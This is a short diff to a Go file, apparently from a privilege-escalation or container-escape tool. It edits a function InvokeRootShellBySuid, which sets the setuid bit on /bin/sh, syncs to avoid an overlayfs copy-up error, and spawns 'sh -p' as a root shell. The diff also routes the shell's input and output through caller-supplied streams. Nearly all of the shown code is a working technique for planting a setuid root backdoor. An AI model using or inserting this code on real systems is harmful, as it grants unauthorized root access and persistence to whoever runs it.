@@ -2,6 +2,7 @@ package internal
 
 import (
 	"github.com/ssst0n3/awesome_libs/awesome_error"
+	"io"
 	"os"
 	"os/exec"
 	"syscall"
@@ -15,7 +16,7 @@ func InvokeRootShellBySu() {
 	shell.Run()
 }
 
-func InvokeRootShellBySuid() (err error) {
+func InvokeRootShellBySuid(i io.Reader, o, e io.Writer) (err error) {
 	// Incorrect call:
 	//     os.Chmod("/bin/dash", 06755)
 	//
@@ -32,7 +33,7 @@ func InvokeRootShellBySuid() (err error) {
 	// e.g.
 	// syscall.Chmod("/bin/dash", 06755)
 	// os.Chmod("/bin/dash", os.ModePerm|os.ModeSetuid|os.ModeSetgid)
-	err = syscall.Chmod("/bin/dash", 04755)
+	err = syscall.Chmod("/bin/sh", 04755)
 	if err != nil {
 		awesome_error.CheckErr(err)
 		return
@@ -40,9 +41,9 @@ func InvokeRootShellBySuid() (err error) {
 	// prevent the text-busy error caused by overlayfs's copy-up
 	syscall.Sync()
 	shell := exec.Command("/bin/sh", "-p")
-	shell.Stdout = os.Stdout
-	shell.Stdin = os.Stdin
-	shell.Stderr = os.Stderr
+	shell.Stdin = i
+	shell.Stdout = o
+	shell.Stderr = e
 	err = shell.Run()
 	if err != nil {
 		awesome_error.CheckErr(err)
